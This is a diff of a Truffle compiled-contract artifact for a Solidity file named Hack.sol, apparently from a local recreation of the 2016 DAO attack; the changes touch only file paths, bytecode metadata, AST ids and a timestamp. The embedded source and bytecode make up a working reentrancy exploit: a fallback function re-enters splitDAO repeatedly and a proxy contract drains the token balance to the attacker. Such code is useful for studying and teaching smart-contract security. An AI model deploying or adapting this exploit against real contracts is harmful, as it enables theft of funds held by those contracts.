@@ -22,14 +22,14 @@
       "type": "function"
     }
   ],
-  "bytecode": "0x6060604052341561000f57600080fd5b6040516020806103908339810160405280805190602001909190505033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506102d4806100bc6000396000f300606060405260043610610041576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063f2a75fe414610046575b600080fd5b341561005157600080fd5b61005961005b565b005b6000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156100b9576102a5565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306000604051602001526040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b151561017d57600080fd5b6102c65a03f1151561018e57600080fd5b5050506040518051905090506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16836000604051602001526040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050602060405180830381600087803b151561028857600080fd5b6102c65a03f1151561029957600080fd5b50505060405180519050505b505600a165627a7a723058200feb35380b00fd0e0f6fa6f8f95ee7e660b5797b01760e64a9dc35b5f23717d00029",
-  "deployedBytecode": "0x606060405260043610610041576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063f2a75fe414610046575b600080fd5b341561005157600080fd5b61005961005b565b005b6000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156100b9576102a5565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306000604051602001526040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b151561017d57600080fd5b6102c65a03f1151561018e57600080fd5b5050506040518051905090506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16836000604051602001526040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050602060405180830381600087803b151561028857600080fd5b6102c65a03f1151561029957600080fd5b50505060405180519050505b505600a165627a7a723058200feb35380b00fd0e0f6fa6f8f95ee7e660b5797b01760e64a9dc35b5f23717d00029",
+  "bytecode": "0x6060604052341561000f57600080fd5b6040516020806103908339810160405280805190602001909190505033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506102d4806100bc6000396000f300606060405260043610610041576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063f2a75fe414610046575b600080fd5b341561005157600080fd5b61005961005b565b005b6000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156100b9576102a5565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306000604051602001526040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b151561017d57600080fd5b6102c65a03f1151561018e57600080fd5b5050506040518051905090506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16836000604051602001526040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050602060405180830381600087803b151561028857600080fd5b6102c65a03f1151561029957600080fd5b50505060405180519050505b505600a165627a7a723058205922b1afdc87fbb61a4f955b3f1b13d1aa4d05837a8a3f4498056d75f7a95bc20029",
+  "deployedBytecode": "0x606060405260043610610041576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063f2a75fe414610046575b600080fd5b341561005157600080fd5b61005961005b565b005b6000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156100b9576102a5565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306000604051602001526040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b151561017d57600080fd5b6102c65a03f1151561018e57600080fd5b5050506040518051905090506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16836000604051602001526040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050602060405180830381600087803b151561028857600080fd5b6102c65a03f1151561029957600080fd5b50505060405180519050505b505600a165627a7a723058205922b1afdc87fbb61a4f955b3f1b13d1aa4d05837a8a3f4498056d75f7a95bc20029",
   "sourceMap": "30:285:4:-;;;87:88;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;130:10;122:5;;:18;;;;;;;;;;;;;;;;;;165:4;146:3;;:24;;;;;;;;;;;;;;;;;;87:88;30:285;;;;;;",
   "deployedSourceMap": "30:285:4:-;;;;;;;;;;;;;;;;;;;;;;;;179:134;;;;;;;;;;;;;;;240:12;220:5;;;;;;;;;;;206:19;;:10;:19;;;;202:32;;;227:7;;202:32;255:3;;;;;;;;;;;:13;;;269:4;255:19;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;240:34;;280:3;;;;;;;;;;;:12;;;293:5;;;;;;;;;;;300:7;280:28;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;179:134;;:::o",
   "source": "import \"./DAOInterface.sol\";\n\ncontract Proxy {\n  DAOInterface DAO;\n  address owner;\n\n  function Proxy(address _dao) {\n    owner = msg.sender;\n    DAO = DAOInterface(_dao);\n  }\n\n  function empty() {\n    if (msg.sender != owner) return;\n\n    uint balance = DAO.balanceOf(this);\n    DAO.transfer(owner, balance);\n  }\n}\n\ncontract Hack {\n  uint public proposalID;\n  DAOInterface public DAO;\n  uint public calls_to_make;\n  uint public calls;\n  Proxy public proxy;\n\n  function Hack(address _dao) {\n    DAO = DAOInterface(_dao);\n    calls = 0;\n    proxy = new Proxy(_dao);\n    calls_to_make = 1;\n  }\n\n  function makeSplitProposal() {\n    // 0x4c6f6e656c792c20736f204c6f6e656c79 == \"Lonely, so Lonely\"\n    // 0x93a80 == 604800 == 1 week in seconds\n    bytes memory transactionData;\n    proposalID = DAO.newProposal(this, 0x0, \"Lonely, so Lonely\", transactionData, 0x93a80, true);\n  }\n\n  function voteYesOnProposal() {\n    DAO.vote(proposalID, true);\n  }\n\n  function fillProxy() {\n    uint balance = DAO.balanceOf(this);\n    DAO.transfer(address(proxy), balance);\n  }\n\n  function splitDAO() {\n    calls += 1;\n    DAO.splitDAO(proposalID, this);\n  }\n\n  function runHack(uint _calls_to_make) {\n    calls = 0;\n    calls_to_make = _calls_to_make;\n    proxy.empty();\n    splitDAO();\n  }\n\n  function() {\n    if (calls < calls_to_make) {\n      splitDAO();\n    } else {\n      fillProxy();\n    }\n  }\n}\n",
-  "sourcePath": "/home/utkarash/dao-truffle/contracts/Hack.sol",
+  "sourcePath": "/home/utkarash/DAO_truffle_modified/contracts/Hack.sol",
   "ast": {
-    "absolutePath": "/home/utkarash/dao-truffle/contracts/Hack.sol",
+    "absolutePath": "/home/utkarash/DAO_truffle_modified/contracts/Hack.sol",
     "exportedSymbols": {
       "Hack": [
         2344
@@ -42,7 +42,7 @@
     "nodeType": "SourceUnit",
     "nodes": [
       {
-        "absolutePath": "/home/utkarash/dao-truffle/contracts/DAOInterface.sol",
+        "absolutePath": "/home/utkarash/DAO_truffle_modified/contracts/DAOInterface.sol",
         "file": "./DAOInterface.sol",
         "id": 2157,
         "nodeType": "ImportDirective",
@@ -156,7 +156,7 @@
                         "name": "msg",
                         "nodeType": "Identifier",
                         "overloadedDeclarations": [],
-                        "referencedDeclaration": 3065,
+                        "referencedDeclaration": 3066,
                         "src": "130:3:4",
                         "typeDescriptions": {
                           "typeIdentifier": "t_magic_message",
@@ -350,7 +350,7 @@
                         "name": "msg",
                         "nodeType": "Identifier",
                         "overloadedDeclarations": [],
-                        "referencedDeclaration": 3065,
+                        "referencedDeclaration": 3066,
                         "src": "206:3:4",
                         "typeDescriptions": {
                           "typeIdentifier": "t_magic_message",
@@ -446,7 +446,7 @@
                         "name": "this",
                         "nodeType": "Identifier",
                         "overloadedDeclarations": [],
-                        "referencedDeclaration": 3096,
+                        "referencedDeclaration": 3097,
                         "src": "269:4:4",
                         "typeDescriptions": {
                           "typeIdentifier": "t_contract$_Proxy_$2203",
@@ -481,7 +481,7 @@
                       "lValueRequested": false,
                       "memberName": "balanceOf",
                       "nodeType": "MemberAccess",
-                      "referencedDeclaration": 2998,
+                      "referencedDeclaration": 2999,
                       "src": "255:13:4",
                       "typeDescriptions": {
                         "typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
@@ -567,7 +567,7 @@
                       "lValueRequested": false,
                       "memberName": "transfer",
                       "nodeType": "MemberAccess",
-                      "referencedDeclaration": 3007,
+                      "referencedDeclaration": 3008,
                       "src": "280:12:4",
                       "typeDescriptions": {
                         "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$",
@@ -1186,7 +1186,7 @@
                           "name": "this",
                           "nodeType": "Identifier",
                           "overloadedDeclarations": [],
-                          "referencedDeclaration": 3098,
+                          "referencedDeclaration": 3099,
                           "src": "806:4:4",
                           "typeDescriptions": {
                             "typeIdentifier": "t_contract$_Hack_$2344",
@@ -1559,7 +1559,7 @@
                         "name": "this",
                         "nodeType": "Identifier",
                         "overloadedDeclarations": [],
-                        "referencedDeclaration": 3098,
+                        "referencedDeclaration": 3099,
                         "src": "1004:4:4",
                         "typeDescriptions": {
                           "typeIdentifier": "t_contract$_Hack_$2344",
@@ -1594,7 +1594,7 @@
                       "lValueRequested": false,
                       "memberName": "balanceOf",
                       "nodeType": "MemberAccess",
-                      "referencedDeclaration": 2998,
+                      "referencedDeclaration": 2999,
                       "src": "990:13:4",
                       "typeDescriptions": {
                         "typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
@@ -1718,7 +1718,7 @@
                       "lValueRequested": false,
                       "memberName": "transfer",
                       "nodeType": "MemberAccess",
-                      "referencedDeclaration": 3007,
+                      "referencedDeclaration": 3008,
                       "src": "1015:12:4",
                       "typeDescriptions": {
                         "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$",
@@ -1851,7 +1851,7 @@
                         "name": "this",
                         "nodeType": "Identifier",
                         "overloadedDeclarations": [],
-                        "referencedDeclaration": 3098,
+                        "referencedDeclaration": 3099,
                         "src": "1128:4:4",
                         "typeDescriptions": {
                           "typeIdentifier": "t_contract$_Hack_$2344",
@@ -2363,7 +2363,7 @@
     "src": "0:1383:4"
   },
   "legacyAST": {
-    "absolutePath": "/home/utkarash/dao-truffle/contracts/Hack.sol",
+    "absolutePath": "/home/utkarash/DAO_truffle_modified/contracts/Hack.sol",
     "exportedSymbols": {
       "Hack": [
         2344
@@ -2376,7 +2376,7 @@
     "nodeType": "SourceUnit",
     "nodes": [
       {
-        "absolutePath": "/home/utkarash/dao-truffle/contracts/DAOInterface.sol",
+        "absolutePath": "/home/utkarash/DAO_truffle_modified/contracts/DAOInterface.sol",
         "file": "./DAOInterface.sol",
         "id": 2157,
         "nodeType": "ImportDirective",
@@ -2490,7 +2490,7 @@
                         "name": "msg",
                         "nodeType": "Identifier",
                         "overloadedDeclarations": [],
-                        "referencedDeclaration": 3065,
+                        "referencedDeclaration": 3066,
                         "src": "130:3:4",
                         "typeDescriptions": {
                           "typeIdentifier": "t_magic_message",
@@ -2684,7 +2684,7 @@
                         "name": "msg",
                         "nodeType": "Identifier",
                         "overloadedDeclarations": [],
-                        "referencedDeclaration": 3065,
+                        "referencedDeclaration": 3066,
                         "src": "206:3:4",
                         "typeDescriptions": {
                           "typeIdentifier": "t_magic_message",
@@ -2780,7 +2780,7 @@
                         "name": "this",
                         "nodeType": "Identifier",
                         "overloadedDeclarations": [],
-                        "referencedDeclaration": 3096,
+                        "referencedDeclaration": 3097,
                         "src": "269:4:4",
                         "typeDescriptions": {
                           "typeIdentifier": "t_contract$_Proxy_$2203",
@@ -2815,7 +2815,7 @@
                       "lValueRequested": false,
                       "memberName": "balanceOf",
                       "nodeType": "MemberAccess",
-                      "referencedDeclaration": 2998,
+                      "referencedDeclaration": 2999,
                       "src": "255:13:4",
                       "typeDescriptions": {
                         "typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
@@ -2901,7 +2901,7 @@
                       "lValueRequested": false,
                       "memberName": "transfer",
                       "nodeType": "MemberAccess",
-                      "referencedDeclaration": 3007,
+                      "referencedDeclaration": 3008,
                       "src": "280:12:4",
                       "typeDescriptions": {
                         "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$",
@@ -3520,7 +3520,7 @@
                           "name": "this",
                           "nodeType": "Identifier",
                           "overloadedDeclarations": [],
-                          "referencedDeclaration": 3098,
+                          "referencedDeclaration": 3099,
                           "src": "806:4:4",
                           "typeDescriptions": {
                             "typeIdentifier": "t_contract$_Hack_$2344",
@@ -3893,7 +3893,7 @@
                         "name": "this",
                         "nodeType": "Identifier",
                         "overloadedDeclarations": [],
-                        "referencedDeclaration": 3098,
+                        "referencedDeclaration": 3099,
                         "src": "1004:4:4",
                         "typeDescriptions": {
                           "typeIdentifier": "t_contract$_Hack_$2344",
@@ -3928,7 +3928,7 @@
                       "lValueRequested": false,
                       "memberName": "balanceOf",
                       "nodeType": "MemberAccess",
-                      "referencedDeclaration": 2998,
+                      "referencedDeclaration": 2999,
                       "src": "990:13:4",
                       "typeDescriptions": {
                         "typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
@@ -4052,7 +4052,7 @@
                       "lValueRequested": false,
                       "memberName": "transfer",
                       "nodeType": "MemberAccess",
-                      "referencedDeclaration": 3007,
+                      "referencedDeclaration": 3008,
                       "src": "1015:12:4",
                       "typeDescriptions": {
                         "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$",
@@ -4185,7 +4185,7 @@
                         "name": "this",
                         "nodeType": "Identifier",
                         "overloadedDeclarations": [],
-                        "referencedDeclaration": 3098,
+                        "referencedDeclaration": 3099,
                         "src": "1128:4:4",
                         "typeDescriptions": {
                           "typeIdentifier": "t_contract$_Hack_$2344",
@@ -4702,5 +4702,5 @@
   },
   "networks": {},
   "schemaVersion": "2.0.0",
-  "updatedAt": "2018-03-10T18:24:34.676Z"
+  "updatedAt": "2018-03-11T18:36:56.930Z"
 }
